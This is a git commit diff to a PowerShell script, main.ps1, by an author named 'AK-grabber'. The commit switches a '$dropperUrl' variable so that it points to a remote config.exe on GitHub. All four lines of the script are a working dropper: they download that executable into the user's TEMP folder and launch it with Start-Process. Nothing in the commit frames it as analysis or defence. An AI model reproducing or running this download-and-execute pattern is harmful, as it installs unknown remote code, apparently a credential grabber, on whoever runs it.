bab5f4cb739d304868e0e8c273923a523ec9b02a
AK-grabber <akaltbytheg@gmail.com>
2025-02-21 04:51:15 +0300

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,4 +1,4 @@
-$dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/refs/heads/main/main.ps1"
+$dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/refs/heads/main/config.exe"
 $tempPath = "$env:TEMP\config.exe"
 Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
 Start-Process -FilePath $tempPath
